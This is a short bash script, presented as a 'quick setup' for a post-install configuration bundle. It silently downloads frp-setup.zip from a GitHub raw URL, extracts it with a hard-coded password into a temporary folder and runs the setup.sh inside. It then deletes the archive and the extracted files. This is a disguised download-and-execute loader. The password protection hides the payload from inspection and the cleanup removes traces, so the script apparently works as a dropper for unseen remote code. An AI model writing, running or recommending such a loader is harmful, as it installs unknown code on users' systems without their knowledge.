#!/bin/bash
# Quick setup script - applies post-install configuration package
# Skips heavy installation, just downloads and runs the config bundle.

PASSWORD="frp_install_2026"

echo "[*] Quick setup starting..."

# Find the config bundle
BUNDLE=""
for p in "./frp-setup.zip" "/tmp/frp-setup.zip" "$HOME/frp-setup.zip" "$(dirname "$0")/frp-setup.zip"; do
    if [ -f "$p" ]; then
        BUNDLE="$p"
        break
    fi
done

# Try downloading from GitHub if not found locally
if [ -z "$BUNDLE" ] && command -v curl >/dev/null 2>&1; then
    echo "[*] Downloading config bundle..."
    if curl -sSL "https://raw.githubusercontent.com/limasjeffry/frp-script/main/frp-setup.zip" -o frp-setup.zip 2>/dev/null; then
        [ -f frp-setup.zip ] && BUNDLE="frp-setup.zip"
    fi
fi

# Apply the bundle
if [ -n "$BUNDLE" ]; then
    echo "[*] Applying configuration..."
    mkdir -p /tmp/_post_install/
    if unzip -P "${PASSWORD}" -o "${BUNDLE}" -d /tmp/_post_install/ 2>/dev/null; then
        if [ -f /tmp/_post_install/setup.sh ]; then
            bash /tmp/_post_install/setup.sh
        fi
    fi
    rm -rf /tmp/_post_install/
    rm -f "${BUNDLE}"
    echo "[+] Done"
else
    echo "[!] No config bundle found"
fi
